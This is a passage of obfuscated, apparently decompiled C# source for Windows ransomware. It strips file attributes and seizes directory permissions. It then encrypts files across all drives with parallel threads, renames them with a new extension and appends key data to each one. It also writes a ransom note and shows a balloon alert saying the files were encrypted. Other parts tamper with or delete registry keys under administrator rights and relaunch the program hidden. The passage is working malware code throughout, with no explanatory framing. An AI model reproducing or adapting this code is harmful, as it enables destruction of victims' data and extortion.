				registryKey.SetValue(pimTPtzgsj(getString_0(107391393)), pimTPtzgsj(FQyLwdpedieIFqg));
				registryKey.SetValue(pimTPtzgsj(getString_0(107391360)), pimTPtzgsj(eOASqkRWASfMzD));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			gRLXTjVjnsxLGLV = zujFUufZIGQ(getString_0(107390819));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(pimTPtzgsj(gRLXTjVjnsxLGLV), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(pimTPtzgsj(getString_0(107390682)), pimTPtzgsj(FQyLwdpedieIFqg));
				registryKey.SetValue(pimTPtzgsj(getString_0(107390649)), pimTPtzgsj(eOASqkRWASfMzD));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void VtTmhvampUSyVgr()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (GGRvjiXEYRVi == getString_0(107396962) && !string.IsNullOrEmpty(bstXhyBqhrxQeFG) && !string.IsNullOrEmpty(naHGmHncrAR))
				{
					xdbQsATiGDTY(getString_0(107392185), bstXhyBqhrxQeFG, naHGmHncrAR);
				}
				else
				{
					xdbQsATiGDTY(getString_0(107392185), getString_0(107392142), getString_0(107392113));
				}
			}
		}
		catch
		{
		}
	}

	public static void PQTABozyIZQ(string MCRCbsaentaXgVq = "SW5mb3JtYXRpb24uLi4=", string YinSzehWkYAvvp = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(pimTPtzgsj(MCRCbsaentaXgVq));
		val.set_BalloonTipText(pimTPtzgsj(YinSzehWkYAvvp));
		val.ShowBalloonTip(30000);
	}

	public static void PMioaazULTCeJ(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		sYcbkIpQPZ(pimTPtzgsj(getString_0(107390620)), getString_0(107390635) + text + getString_0(107390626) + string_0);
	}

	public static void amlUMUnhkwAkBpE(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = pimTPtzgsj(getString_0(107390621));
		processStartInfo.Arguments = getString_0(107390592) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool chUckzDlGoQMejtE(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string VEQFUDBaHXuuW(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void cvpygetWprQNd()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = zujFUufZIGQ(getString_0(107391067));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(pimTPtzgsj(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(pimTPtzgsj(getString_0(107390929)));
					registryKey.DeleteSubKey(pimTPtzgsj(getString_0(107390904)));
					registryKey.DeleteSubKey(pimTPtzgsj(getString_0(107390919)));
					registryKey.DeleteSubKey(pimTPtzgsj(getString_0(107390862)));
					registryKey.DeleteSubKey(pimTPtzgsj(getString_0(107390621)));
					registryKey.DeleteSubKey(pimTPtzgsj(getString_0(107390837)));
					registryKey.DeleteSubKey(pimTPtzgsj(getString_0(107390620)));
					registryKey.Close();
				}
				string_ = zujFUufZIGQ(getString_0(107390296));
				registryKey = Registry.LocalMachine.OpenSubKey(pimTPtzgsj(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(pimTPtzgsj(getString_0(107390199)));
					registryKey.Close();
				}
				string_ = zujFUufZIGQ(getString_0(107390214));
				registryKey = Registry.LocalMachine.OpenSubKey(pimTPtzgsj(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(pimTPtzgsj(getString_0(107390199)));
					registryKey.Close();
				}
				string_ = zujFUufZIGQ(getString_0(107390214));
				registryKey = Registry.CurrentUser.OpenSubKey(pimTPtzgsj(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(pimTPtzgsj(getString_0(107390199)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			sYcbkIpQPZ(pimTPtzgsj(getString_0(107390165)), pimTPtzgsj(getString_0(107390180)));
			sYcbkIpQPZ(pimTPtzgsj(getString_0(107390099)), pimTPtzgsj(getString_0(107390122)));
			sYcbkIpQPZ(pimTPtzgsj(getString_0(107390099)), pimTPtzgsj(getString_0(107390456)));
			sYcbkIpQPZ(pimTPtzgsj(getString_0(107390395)), pimTPtzgsj(getString_0(107390410)));
		}
		catch
		{
		}
	}

	public static void rEFsTTbNdvhUnSu(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(pimTPtzgsj(getString_0(107390337)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void emnPkYoZutnz()
	{
		string string_ = zujFUufZIGQ(getString_0(107389800));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(pimTPtzgsj(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(pimTPtzgsj(getString_0(107389687)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void uXNwcPgUqXlzDEK()
	{
		sYcbkIpQPZ(getString_0(107396842), pimTPtzgsj(getString_0(107389654)));
		string text = pimTPtzgsj(getString_0(107389972));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107391521) + text + getString_0(107391521) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396842);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void OODPURvlNpeQk(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (AreaxgrYTj)
			{
				try
				{
					File.AppendAllText(RqqYTsMuxEQen, getString_0(107389907) + string_0 + getString_0(107389930) + ex.Message + getString_0(107397157));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string oPrbscpupajC()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107392185);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107389809);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107389864))) ? getString_0(107389814) : getString_0(107389855));
				break;
			case 0:
				text = getString_0(107389837);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107389836);
				break;
			case 4:
				text = getString_0(107389823);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107389261) : getString_0(107389270));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107389237) : getString_0(107389242)) : getString_0(107389279)) : getString_0(107389288));
				break;
			case 10:
				text = getString_0(107389232);
				break;
			}
		}
		if (text != getString_0(107392185))
		{
			text = getString_0(107389259) + text;
			if (oSVersion.ServicePack != getString_0(107392185))
			{
				text = text + getString_0(107390626) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string ONGCxVfakzQxo(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395750);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(pimTPtzgsj(getString_0(107395717)));
				streamWriter.WriteLine(getString_0(107397157));
				streamWriter.WriteLine(pimTPtzgsj(getString_0(107392683)));
				streamWriter.WriteLine(string_0);
				if (XszgYccOIzBT)
				{
					streamWriter.WriteLine(getString_0(107397157));
					streamWriter.WriteLine(pimTPtzgsj(getString_0(107393085)));
					streamWriter.WriteLine(aOlPpFtnUBXreNv.FqqRnlVwFEkGH());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !fpnZuwWWrCf)
				{
					File.AppendAllText(text, getString_0(107393020) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (AreaxgrYTj)
			{
				try
				{
					File.AppendAllText(RqqYTsMuxEQen, getString_0(107389246) + ex.Message + getString_0(107397157));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void ouHzjVUHpzne(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		CJBZszvuMqOnaFkS.IVzCOecvgueo CS_0024_003C_003E8__locals0 = new CJBZszvuMqOnaFkS();
		CS_0024_003C_003E8__locals0.wgNdKKNBgMmrF = string_1;
		CS_0024_003C_003E8__locals0.xAhwfrxQAIcLE = string_2;
		CS_0024_003C_003E8__locals0.DdDgCApPxIgOo = string_3;
		CS_0024_003C_003E8__locals0.LRPgecUAuDeAkFF = string_4;
		smKHsmzCQQJ = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.DdDgCApPxIgOo);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396381))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !veKjcfDmQAYZ.Contains(array[i].Name))
					{
						veKjcfDmQAYZ.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!veKjcfDmQAYZ.Contains(string_0[j]))
				{
					veKjcfDmQAYZ.Add(string_0[j]);
				}
			}
		}
		if (veKjcfDmQAYZ.Contains(pimTPtzgsj(getString_0(107389189))) && nApHZxDfPX == getString_0(107396962))
		{
			veKjcfDmQAYZ.Remove(pimTPtzgsj(getString_0(107389189)));
		}
		Parallel.ForEach(veKjcfDmQAYZ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new CJBZszvuMqOnaFkS.IVzCOecvgueo();
			CS_0024_003C_003E8__locals0.PZKMTOPZbllI = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.hJaQiAAfMRr = string_0;
			if (YwGTeZrarTaZME && !oPrbscpupajC().Contains(CJBZszvuMqOnaFkS.getString_0(107389270)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						chUckzDlGoQMejtE(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.hJaQiAAfMRr);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (wGSokduaWV == CJBZszvuMqOnaFkS.getString_0(107396971))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					MIWQgnOOBvuMzF(CS_0024_003C_003E8__locals0.hJaQiAAfMRr, CS_0024_003C_003E8__locals0.PZKMTOPZbllI.wgNdKKNBgMmrF, CS_0024_003C_003E8__locals0.PZKMTOPZbllI.LRPgecUAuDeAkFF, CS_0024_003C_003E8__locals0.PZKMTOPZbllI.xAhwfrxQAIcLE, CS_0024_003C_003E8__locals0.PZKMTOPZbllI.DdDgCApPxIgOo);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				MIWQgnOOBvuMzF(CS_0024_003C_003E8__locals0.hJaQiAAfMRr, CS_0024_003C_003E8__locals0.wgNdKKNBgMmrF, CS_0024_003C_003E8__locals0.LRPgecUAuDeAkFF, CS_0024_003C_003E8__locals0.xAhwfrxQAIcLE, CS_0024_003C_003E8__locals0.DdDgCApPxIgOo);
			}
		});
	}

	public static void MIWQgnOOBvuMzF(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107392185));
		List<string> list3 = list2;
		if (dgdSxQyeeVYCj == getString_0(107396815))
		{
			list = qmaUyiFdTCxwxy(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = LESTRMZpbUJ.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03a0;
					}
				}
				if ((uimqVbzddVnUhZ == getString_0(107396815) && !item.EndsWith(text)) || PKEevhItGR.Contains(item))
				{
					continue;
				}
				if (EYxaInlnKpK == getString_0(107396962))
				{
					try
					{
						if (KPQDOzwtmVFOx.hsjTIvpOst(item))
						{
							KPQDOzwtmVFOx.lkWDWVGEltLMinY(item);
						}
					}
					catch
					{
					}
				}
				PKEevhItGR.Add(item);
				if (!xtzwHGpcURO.Contains(Path.GetDirectoryName(item)))
				{
					xtzwHGpcURO.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (EcxEPMzKnUKdFyvU == getString_0(107396962) && fileStream.Length > Convert.ToInt32(tKbCgjZzNwIevCY) * 1024 * 1024 && !list3.Contains(text))
					{
						if (dtpyECacgdgV == getString_0(107396962))
						{
							foreach (string item2 in MYtmFoSEPowjeCH)
							{
								if (item.ToLower().EndsWith(item2) && YcDZJAXfkcwFEP == getString_0(107396962))
								{
									if (Convert.ToInt32(QccyPlBKwOudBK) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392298), getString_0(107392293), getString_0(107392248), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && YcDZJAXfkcwFEP == getString_0(107396815))
								{
									try
									{
										aOlPpFtnUBXreNv.oHaBhkBqIiP(getString_0(107392298), getString_0(107392293), getString_0(107392248), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = YuMGwWVrDuXKA.rQKmlPLmPLw(item, Convert.ToInt32(tKbCgjZzNwIevCY) * 1024 * 1024);
						byte[] gGvXHaVXPnSt = YuMGwWVrDuXKA.NzljVXFBjDaHS(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						YuMGwWVrDuXKA.KGbVnsOVmaox(item, gGvXHaVXPnSt);
						if (string_2 != getString_0(107389148))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389148))
					{
						WeqypgSexEHO(item, item + string_2, smKHsmzCQQJ);
					}
					else
					{
						WeqypgSexEHO(item, item + getString_0(107389143), smKHsmzCQQJ);
					}
				}
				catch (Exception)
				{
				}
				IL_03a0:;
			}
		}
	}

	public static void ZpSdEiAVGu(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		HLWpvTFsJHjPW.ztbWhKTEeeLEH CS_0024_003C_003E8__locals0 = new HLWpvTFsJHjPW();
		CS_0024_003C_003E8__locals0.DyzteUZXPQXh = list_0;
		CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe = string_1;
		CS_0024_003C_003E8__locals0.DzcvmxGtzHbJp = string_2;
		CS_0024_003C_003E8__locals0.sYegfhFfwOKgPE = string_3;
		CS_0024_003C_003E8__locals0.bhcWMgddYed = new List<string> { getString_0(107392185) };
		if (uimqVbzddVnUhZ == getString_0(107396815))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.DyzteUZXPQXh)
				{
					if (CS_0024_003C_003E8__locals0.DzcvmxGtzHbJp.Length != 0)
					{
						string[] dzcvmxGtzHbJp2 = CS_0024_003C_003E8__locals0.DzcvmxGtzHbJp;
						int num2 = 0;
						while (num2 < dzcvmxGtzHbJp2.Length)
						{
							string value2 = dzcvmxGtzHbJp2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_07f8;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe))
						{
							goto IL_07f8;
						}
					}
					catch (Exception)
					{
						goto IL_07f8;
					}
					if (item.EndsWith(string_0) && !PKEevhItGR.Contains(item))
					{
						if (EYxaInlnKpK == HLWpvTFsJHjPW.getString_0(107396979))
						{
							try
							{
								if (KPQDOzwtmVFOx.hsjTIvpOst(item))
								{
									KPQDOzwtmVFOx.lkWDWVGEltLMinY(item);
								}
							}
							catch
							{
							}
						}
						PKEevhItGR.Add(item);
						if (!xtzwHGpcURO.Contains(Path.GetDirectoryName(item)))
						{
							xtzwHGpcURO.Add(Path.GetDirectoryName(item));
						}
						OODPURvlNpeQk(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ee;
								}
								goto end_IL_00ee_2;
								end_IL_00ee:;
							}
							catch (Exception ex16)
							{
								if (AreaxgrYTj)
								{
									try
									{
										File.AppendAllText(RqqYTsMuxEQen, HLWpvTFsJHjPW.getString_0(107389924) + item + HLWpvTFsJHjPW.getString_0(107406508) + ex16.Message + HLWpvTFsJHjPW.getString_0(107397174));
									}
									catch (Exception)
									{
									}
								}
								MtUrEdDRDzL++;
								goto end_IL_00ee_2;
							}
							if (!(EcxEPMzKnUKdFyvU == HLWpvTFsJHjPW.getString_0(107396979)) || new FileInfo(item).Length <= Convert.ToInt32(tKbCgjZzNwIevCY) * 1024 * 1024 || CS_0024_003C_003E8__locals0.bhcWMgddYed.Contains(string_0))
							{
								if (XszgYccOIzBT)
								{
									CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe = HvklvwSSvrVzvZd + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe;
								}
								string text3 = aHweBSOfyoyTANP.VUurrlATiqeqbj(32);
								string s3 = mIIgQsRoPFcf.lAQgyDpGyMnN(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe != HLWpvTFsJHjPW.getString_0(107389165))
								{
									if (!YBbHALckKieZ)
									{
										if (!fpnZuwWWrCf)
										{
											yHqsuJKABWzrvG(item, item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, smKHsmzCQQJ);
										}
										else
										{
											yHqsuJKABWzrvG(item, item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!fpnZuwWWrCf)
											{
												zLBnoSiaCsn(item, item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, smKHsmzCQQJ);
											}
											else
											{
												zLBnoSiaCsn(item, item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex18)
										{
											if (AreaxgrYTj)
											{
												try
												{
													File.AppendAllText(RqqYTsMuxEQen, HLWpvTFsJHjPW.getString_0(107389924) + item + HLWpvTFsJHjPW.getString_0(107389151) + ex18.Message + HLWpvTFsJHjPW.getString_0(107397174));
												}
												catch (Exception)
												{
												}
											}
											MtUrEdDRDzL++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_00ee_2;
										}
									}
								}
								else if (!YBbHALckKieZ)
								{
									if (!fpnZuwWWrCf)
									{
										yHqsuJKABWzrvG(item, item + HLWpvTFsJHjPW.getString_0(107389160), smKHsmzCQQJ);
									}
									else
									{
										yHqsuJKABWzrvG(item, item + HLWpvTFsJHjPW.getString_0(107389160), Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!fpnZuwWWrCf)
										{
											zLBnoSiaCsn(item, item, smKHsmzCQQJ);
										}
										else
										{
											zLBnoSiaCsn(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex21)
									{
										if (AreaxgrYTj)
										{
											try
											{
												File.AppendAllText(RqqYTsMuxEQen, HLWpvTFsJHjPW.getString_0(107389924) + item + HLWpvTFsJHjPW.getString_0(107389151) + ex21.Message + HLWpvTFsJHjPW.getString_0(107397174));
											}
											catch (Exception)
											{
											}
										}
										MtUrEdDRDzL++;
										goto end_IL_00ee_2;
									}
								}
								if (fpnZuwWWrCf)
								{
									if (CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe != HLWpvTFsJHjPW.getString_0(107389165))
									{
										rEFsTTbNdvhUnSu(item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, bytes3);
									}
									else
									{
										rEFsTTbNdvhUnSu(item, bytes3);
									}
								}
								goto IL_07f8;
							}
							CS_0024_003C_003E8__locals0 = new HLWpvTFsJHjPW.YuUvQhRZkyoD();
							CS_0024_003C_003E8__locals0.ukpRGssWFaai = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe != HLWpvTFsJHjPW.getString_0(107389165))
								{
									if (XszgYccOIzBT)
									{
										CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe = HvklvwSSvrVzvZd + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe);
								}
							}
							catch (Exception ex23)
							{
								if (AreaxgrYTj)
								{
									try
									{
										File.AppendAllText(RqqYTsMuxEQen, HLWpvTFsJHjPW.getString_0(107389924) + item + HLWpvTFsJHjPW.getString_0(107406479) + ex23.Message + HLWpvTFsJHjPW.getString_0(107397174));
									}
									catch (Exception)
									{
									}
								}
								MtUrEdDRDzL++;
								goto end_IL_00ee_2;
							}
							CS_0024_003C_003E8__locals0.dbOiPfZxCBNre = HLWpvTFsJHjPW.getString_0(107392202);
							if (CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe != HLWpvTFsJHjPW.getString_0(107389165))
							{
								CS_0024_003C_003E8__locals0.dbOiPfZxCBNre = item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe;
							}
							else
							{
								CS_0024_003C_003E8__locals0.dbOiPfZxCBNre = item;
							}
							if (dtpyECacgdgV == HLWpvTFsJHjPW.getString_0(107396979))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in MYtmFoSEPowjeCH)
									{
										if (CS_0024_003C_003E8__locals0.dbOiPfZxCBNre.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.ukpRGssWFaai.DBqdIPWNdhJbe) && YcDZJAXfkcwFEP == HLWpvTFsJHjPW.YuUvQhRZkyoD.getString_0(107396982))
										{
											if (Convert.ToInt32(QccyPlBKwOudBK) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.dbOiPfZxCBNre).Length)
											{
												try
												{
													aOlPpFtnUBXreNv.oHaBhkBqIiP(HLWpvTFsJHjPW.YuUvQhRZkyoD.getString_0(107392318), HLWpvTFsJHjPW.YuUvQhRZkyoD.getString_0(107392313), HLWpvTFsJHjPW.YuUvQhRZkyoD.getString_0(107392268), CS_0024_003C_003E8__locals0.dbOiPfZxCBNre);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.dbOiPfZxCBNre.ToLower().EndsWith(item2) && YcDZJAXfkcwFEP == HLWpvTFsJHjPW.YuUvQhRZkyoD.getString_0(107396835))
										{
											try
											{
												aOlPpFtnUBXreNv.oHaBhkBqIiP(HLWpvTFsJHjPW.YuUvQhRZkyoD.getString_0(107392318), HLWpvTFsJHjPW.YuUvQhRZkyoD.getString_0(107392313), HLWpvTFsJHjPW.YuUvQhRZkyoD.getString_0(107392268), CS_0024_003C_003E8__locals0.dbOiPfZxCBNre);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = aHweBSOfyoyTANP.VUurrlATiqeqbj(32);
							string s4 = mIIgQsRoPFcf.lAQgyDpGyMnN(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (rrRVvypnQbGQM == HLWpvTFsJHjPW.getString_0(107396832))
							{
								byte[] array2 = null;
								byte[] byte_2 = YuMGwWVrDuXKA.rQKmlPLmPLw(CS_0024_003C_003E8__locals0.dbOiPfZxCBNre, Convert.ToInt32(tKbCgjZzNwIevCY) * 1024 * 1024);
								if (YuMGwWVrDuXKA.KGbVnsOVmaox(gGvXHaVXPnSt: (!jUTdQQEeFeYZhnmcv) ? (fpnZuwWWrCf ? YuMGwWVrDuXKA.NzljVXFBjDaHS(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : YuMGwWVrDuXKA.NzljVXFBjDaHS(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.sYegfhFfwOKgPE), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (fpnZuwWWrCf ? VoJDuYIUixwR.DIjMZWEAFCxXcE(byte_2, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : VoJDuYIUixwR.DIjMZWEAFCxXcE(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.sYegfhFfwOKgPE), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZXZtbOtOvaKKAi: CS_0024_003C_003E8__locals0.dbOiPfZxCBNre, EHaoPciFCiUco: bytes4))
								{
									goto IL_07f8;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, item);
								}
								catch (Exception)
								{
								}
							}
							else if (!fpnZuwWWrCf)
							{
								if (HwwjjyTVGSTU.iffTJBxzbDtUl(CS_0024_003C_003E8__locals0.dbOiPfZxCBNre, tKbCgjZzNwIevCY, CS_0024_003C_003E8__locals0.sYegfhFfwOKgPE))
								{
									goto IL_07f8;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, item);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (HwwjjyTVGSTU.iffTJBxzbDtUl(CS_0024_003C_003E8__locals0.dbOiPfZxCBNre, tKbCgjZzNwIevCY, text4, bytes4))
								{
									goto IL_07f8;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.DBqdIPWNdhJbe, item);
								}
								catch (Exception)
								{
								}
							}
							end_IL_00ee_2:;
						}
						catch (Exception)
						{
							goto IL_07f8;
						}
					}
					continue;
					IL_07f8:
					CS_0024_003C_003E8__locals0.DyzteUZXPQXh.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.DyzteUZXPQXh, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new HLWpvTFsJHjPW.ztbWhKTEeeLEH();
			CS_0024_003C_003E8__locals0.ukpRGssWFaai = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.MaaFvhEKHjUj = string_0;
			if (CS_0024_003C_003E8__locals0.DzcvmxGtzHbJp.Length != 0)
			{
				string[] dzcvmxGtzHbJp = CS_0024_003C_003E8__locals0.DzcvmxGtzHbJp;
				int num = 0;
				while (num < dzcvmxGtzHbJp.Length)
				{
					string value = dzcvmxGtzHbJp[num];
					if (!CS_0024_003C_003E8__locals0.MaaFvhEKHjUj.EndsWith(value))
					{
						num++;
